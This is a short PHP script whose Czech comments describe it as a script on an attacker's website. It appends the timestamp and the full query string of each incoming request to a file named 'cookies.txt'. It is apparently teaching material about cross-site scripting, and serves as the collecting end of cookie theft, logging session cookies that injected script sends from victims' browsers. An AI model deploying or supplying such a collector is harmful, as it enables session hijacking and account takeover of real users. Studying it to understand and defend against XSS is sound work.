<?php
//// Toto je skript na webu utocnika,
//// ktery bere cely prijaty dotaz a uklada ho do souboru.

// ziskam data parametru z URL (tj. z GET)
$line = "[". date("Y-m-d_H-i-s"). "]  "
        .$_SERVER["QUERY_STRING"] ."\n";

// pridam data do souboru
file_put_contents(
    "cookies.txt",
    $line,
    FILE_APPEND
);

?>